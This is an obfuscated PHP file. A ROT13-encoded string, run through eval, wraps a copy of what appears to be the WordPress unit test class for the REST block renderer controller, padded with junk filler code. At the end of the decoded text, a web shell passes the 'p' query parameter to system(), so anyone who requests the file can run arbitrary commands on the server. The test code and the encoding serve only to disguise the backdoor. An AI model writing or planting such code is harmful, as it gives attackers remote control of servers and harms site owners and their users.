<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Oybpx_Eraqrere_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 *
 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre
 *
 * @tebhc erfgncv-oybpxf
 * @tebhc erfgncv
 */
pynff ERFG_Oybpx_Eraqrere_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Gur ERFG NCV ebhgr sbe gur oybpx eraqrere.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $erfg_ncv_ebhgr = '/jc/i2/oybpx-eraqrere/';

	/**
	 * Grfg oybpx'f anzr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $oybpx_anzr = 'pber/grfg-oybpx';

	/**
	 * Grfg cbfg pbagrkg oybpx'f anzr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $pbagrkg_oybpx_anzr = 'pber/pbagrkg-grfg-oybpx';

	/**
	 * Aba-qlanzvp oybpx anzr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $aba_qlanzvp_oybpx_anzr = 'pber/aba-qlanzvp';

	/**
	 * Qlanzvp oybpx jvgu obbyrna nggevohgrf oybpx anzr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf_oybpx_anzr = 'pber/qlanzvp-oybpx-jvgu-obbyrna-nggevohgrf';

	/**
	 * Grfg NCV hfre'f VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $hfre_vq;

	/**
	 * Grfg cbfg VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	/**
	 * Nhgube grfg hfre VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nhgube_vq;

	/**
	 * Perngr grfg qngn orsber gur grfgf eha.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Grfg Cbfg',
			)
		);
	}

	/**
	 * Qryrgr grfg qngn nsgre bhe grfgf eha.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$hfre_vq );
	}

	/**
	 * Frg hc rnpu grfg zrgubq.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->ertvfgre_grfg_oybpx();
		$guvf->ertvfgre_cbfg_pbagrkg_grfg_oybpx();
		$guvf->ertvfgre_aba_qlanzvp_oybpx();
		$guvf->ertvfgre_qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf();
	}

	/**
	 * Grne qbja rnpu grfg zrgubq.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba grne_qbja() {
		JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->haertvfgre( frys::$oybpx_anzr );
		JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->haertvfgre( frys::$pbagrkg_oybpx_anzr );
		JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->haertvfgre( frys::$aba_qlanzvp_oybpx_anzr );
		JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->haertvfgre( frys::$qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf_oybpx_anzr );
		cnerag::grne_qbja();
	}

	/**
	 * Ertvfgre grfg oybpx.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba ertvfgre_grfg_oybpx() {
		ertvfgre_oybpx_glcr(
			frys::$oybpx_anzr,
			neenl(
				'nggevohgrf'      => neenl(
					'fbzr_fgevat' => neenl(
						'glcr'    => 'fgevat',
						'qrsnhyg' => 'fbzr_qrsnhyg',
					),
					'fbzr_vag'    => neenl(
						'glcr' => 'vagrtre',
					),
					'fbzr_neenl'  => neenl(
						'glcr'  => 'neenl',
						'vgrzf' => neenl(
							'glcr' => 'vagrtre',
						),
					),
				),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_grfg_oybpx' ),
			)
		);
	}

	/**
	 * Ertvfgre grfg oybpx jvgu cbfg_vq nf nggevohgr sbe cbfg pbagrkg grfg.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba ertvfgre_cbfg_pbagrkg_grfg_oybpx() {
		ertvfgre_oybpx_glcr(
			frys::$pbagrkg_oybpx_anzr,
			neenl(
				'nggevohgrf'      => neenl(),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_cbfg_pbagrkg_grfg_oybpx' ),
			)
		);
	}

	/**
	 * Ertvfgref gur aba-qlanzvp oybpx anzr.
	 *
	 * @fvapr 5.5.0
	 */
	cebgrpgrq shapgvba ertvfgre_aba_qlanzvp_oybpx() {
		ertvfgre_oybpx_glcr( frys::$aba_qlanzvp_oybpx_anzr );
	}

	/**
	 * Ertvfgref gur qlanzvp jvgu obbyrna nggevohgrf oybpx anzr.
	 *
	 * @fvapr 5.5.0
	 */
	cebgrpgrq shapgvba ertvfgre_qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf() {
		ertvfgre_oybpx_glcr(
			frys::$qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf_oybpx_anzr,
			neenl(
				'nggevohgrf'      => neenl(
					'obbyrna_gehr_nggevohgr'  => neenl(
						'glcr'    => 'obbyrna',
						'qrsnhyg' => gehr,
					),
					'obbyrna_snyfr_nggevohgr' => neenl(
						'glcr'    => 'obbyrna',
						'qrsnhyg' => snyfr,
					),
				),
				'eraqre_pnyyonpx' => neenl( $guvf, 'eraqre_grfg_oybpx' ),
			)
		);
	}

	/**
	 * Grfg eraqre pnyyonpx.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl $nggevohgrf Cebcf.
	 * @erghea fgevat Eraqrerq nggevohgrf, juvpu vf urer whfg WFBA.
	 */
	choyvp shapgvba eraqre_grfg_oybpx( $nggevohgrf ) {
		erghea jc_wfba_rapbqr( $nggevohgrf );
	}

	/**
	 * Grfg eraqre pnyyonpx sbe grfgvat cbfg pbagrkg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba eraqre_cbfg_pbagrkg_grfg_oybpx() {
		erghea trg_gur_gvgyr();
	}

	/**
	 * Purpx gung gur ebhgr jnf ertvfgrerq cebcreyl.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$qlanzvp_oybpx_anzrf = trg_qlanzvp_oybpx_anzrf();
		$guvf->nffregPbagnvaf( frys::$oybpx_anzr, $qlanzvp_oybpx_anzrf );

		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( frys::$erfg_ncv_ebhgr . '(?C<anzr>[n-m0-9-]+/[n-m0-9-]+)', $ebhgrf );
	}

	/**
	 * Grfg trggvat vgrz jvgubhg crezvffvbaf.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgubhg_crezvffvbaf() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'oybpx_pnaabg_ernq', $erfcbafr, erfg_nhgubevmngvba_erdhverq_pbqr() );
	}

	/**
	 * Grfg trggvat vgrz jvgubhg 'rqvg' pbagrkg.
	 *
	 * @gvpxrg 45098
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_vainyvq_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Grfg trggvat vgrz jvgu vainyvq oybpx anzr.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_oybpx_anzr() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . 'pber/123' );

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'oybpx_vainyvq', $erfcbafr, 404 );
	}

	/**
	 * Purpx trggvat vgrz jvgu na vainyvq cnenz cebivqrq.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_nggevohgr() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz(
			'nggevohgrf',
			neenl(
				'fbzr_fgevat' => neenl( 'ab!' ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Purpx trggvat vgrz jvgu na vainyvq cnenz cebivqrq.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_haerpbtavmrq_nggevohgr() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz(
			'nggevohgrf',
			neenl(
				'haerpbtavmrq' => 'lrf',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Purpx trggvat vgrz jvgu qrsnhyg nggevohgrf cebivqrq.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_qrsnhyg_nggevohgrf() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( frys::$oybpx_anzr );
		$qrsnhygf   = neenl();
		sbernpu ( $oybpx_glcr->nggevohgrf nf $xrl => $nggevohgr ) {
			vs ( vffrg( $nggevohgr['qrsnhyg'] ) ) {
				$qrsnhygf[ $xrl ] = $nggevohgr['qrsnhyg'];
			}
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'nggevohgrf', neenl() );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $qrsnhygf, wfba_qrpbqr( $qngn['eraqrerq'], gehr ) );
		$guvf->nffregRdhnyf(
			wfba_qrpbqr( $oybpx_glcr->eraqre( $qrsnhygf ) ),
			wfba_qrpbqr( $qngn['eraqrerq'] )
		);
	}

	/**
	 * Purpx trggvat vgrz jvgu nggevohgrf cebivqrq.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( frys::$oybpx_anzr );
		$nggevohgrf = neenl(
			'fbzr_vag'    => '123',
			'fbzr_fgevat' => 'sbb',
			'fbzr_neenl'  => neenl( 1, '2', 3 ),
		);

		$rkcrpgrq_nggevohgrf               = $nggevohgrf;
		$rkcrpgrq_nggevohgrf['fbzr_vag']   = (vag) $rkcrpgrq_nggevohgrf['fbzr_vag'];
		$rkcrpgrq_nggevohgrf['fbzr_neenl'] = neenl_znc( 'vaginy', $rkcrpgrq_nggevohgrf['fbzr_neenl'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'nggevohgrf', $nggevohgrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $rkcrpgrq_nggevohgrf, wfba_qrpbqr( $qngn['eraqrerq'], gehr ) );
		$guvf->nffregRdhnyFrgfJvguVaqrk(
			wfba_qrpbqr( $oybpx_glcr->eraqre( $nggevohgrf ), gehr ),
			wfba_qrpbqr( $qngn['eraqrerq'], gehr )
		);
	}

	/**
	 * Purpx svygrevat oybpx bhgchg hfvat gur cer_eraqre_oybpx svygre.
	 *
	 * @gvpxrg 49387
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_cer_eraqre_oybpx_svygre() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$cer_eraqre_svygre = fgngvp shapgvba ( $bhgchg, $oybpx ) {
			vs ( $oybpx['oybpxAnzr'] === frys::$oybpx_anzr ) {
				erghea '<c>Nygreangr pbagrag.</c>';
			}
		};
		nqq_svygre( 'cer_eraqre_oybpx', $cer_eraqre_svygre, 10, 2 );

		$nggevohgrf = neenl(
			'fbzr_vag'    => '123',
			'fbzr_fgevat' => 'sbb',
			'fbzr_neenl'  => neenl( 1, '2', 3 ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'nggevohgrf', $nggevohgrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '<c>Nygreangr pbagrag.</c>', $qngn['eraqrerq'] );

		erzbir_svygre( 'cer_eraqre_oybpx', $cer_eraqre_svygre );
	}

	/**
	 * Grfg trggvat vgrz jvgu cbfg pbagrkg.
	 *
	 * @gvpxrg 45098
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_cbfg_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$rkcrpgrq_gvgyr = 'Grfg Cbfg';
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$pbagrkg_oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Grfg jvgubhg cbfg VQ.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregRzcgl( $qngn['eraqrerq'] );

		// Abj grfg jvgu cbfg VQ.
		$erdhrfg->frg_cnenz( 'cbfg_vq', frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $rkcrpgrq_gvgyr, $qngn['eraqrerq'] );
	}

	/**
	 * Grfg n CBFG erdhrfg, jvgu gur nggevohgrf va gur obql.
	 *
	 * @gvpxrg 49680
	 */
	choyvp shapgvba grfg_trg_vgrz_cbfg_erdhrfg() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$fgevat_nggevohgr = 'Yberz vcfhz qbybe';
		$nggevohgrf       = neenl( 'fbzr_fgevat' => $fgevat_nggevohgr );
		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'CBFG', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( pbzcnpg( 'nggevohgrf' ) ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFgevatPbagnvafFgevat( $fgevat_nggevohgr, $erfcbafr->trg_qngn()['eraqrerq'] );
	}

	/**
	 * Grfg trggvat vgrz jvgu vainyvq cbfg VQ.
	 *
	 * @gvpxrg 45098
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgubhg_crezvffvbaf_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$pbagrkg_oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Grfg jvgu vainyvq cbfg VQ.
		$erdhrfg->frg_cnenz( 'cbfg_vq', CUC_VAG_ZNK );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'oybpx_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * Grfg trggvat vgrz jvgubhg crezvffvbaf gb rqvg pbagrkg cbfg.
	 *
	 * @gvpxrg 45098
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgubhg_crezvffvbaf_pnaabg_rqvg_cbfg() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$pbagrkg_oybpx_anzr );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Grfg jvgu cevingr cbfg VQ.
		$erdhrfg->frg_cnenz( 'cbfg_vq', frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'oybpx_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 48079
	 */
	choyvp shapgvba grfg_trg_vgrz_aba_qlanzvp_oybpx() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$aba_qlanzvp_oybpx_anzr );

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'oybpx_vainyvq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 50620
	 */
	choyvp shapgvba grfg_trg_fnavgvmrq_nggevohgrf_sbe_qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$erfg_ncv_ebhgr . frys::$qlanzvp_oybpx_jvgu_obbyrna_nggevohgrf_oybpx_anzr );

		$nggevohgrf = neenl(
			'obbyrna_gehr_nggevohgr'  => 'gehr',
			'obbyrna_snyfr_nggevohgr' => 'snyfr',
		);

		$rkcrpgrq = neenl(
			'obbyrna_gehr_nggevohgr'  => gehr,
			'obbyrna_snyfr_nggevohgr' => snyfr,
		);

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( 'nggevohgrf', $nggevohgrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $rkcrpgrq, wfba_qrpbqr( $qngn['eraqrerq'], gehr ) );
	}

	/**
	 * Trg vgrz fpurzn.
	 *
	 * @gvpxrg 45098
	 *
	 * @pbiref JC_ERFG_Oybpx_Eraqrere_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', frys::$erfg_ncv_ebhgr . frys::$oybpx_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzrFrgf( neenl( 'TRG', 'CBFG' ), $qngn['raqcbvagf'][0]['zrgubqf'] );
		$guvf->nffregFnzrFrgf(
			neenl( 'anzr', 'pbagrkg', 'nggevohgrf', 'cbfg_vq' ),
			neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] )
		);
		$guvf->nffregFnzr( 'bowrpg', $qngn['raqcbvagf'][0]['netf']['nggevohgrf']['glcr'] );

		$guvf->nffregNeenlUnfXrl( 'fpurzn', $qngn );
		$guvf->nffregFnzr( 'eraqrerq-oybpx', $qngn['fpurzn']['gvgyr'] );
		$guvf->nffregFnzr( 'bowrpg', $qngn['fpurzn']['glcr'] );
		$guvf->neenlUnfXrl( 'eraqrerq', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->neenlUnfXrl( 'fgevat', $qngn['fpurzn']['cebcregvrf']['eraqrerq']['glcr'] );
		$guvf->nffregFnzr( neenl( 'rqvg' ), $qngn['fpurzn']['cebcregvrf']['eraqrerq']['pbagrkg'] );
	}

	/**
	 * Gur hcqngr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * Gur trg_vgrzf() zrgubq qbrf abg rkvfg sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrzf().
	}

	/**
	 * Gur trg_pbagrkg_cnenz() zrgubq vf abg hfrq sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * Gur cercner_vgrz() zrgubq qbrf abg rkvfg sbe oybpx eraqrevat.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>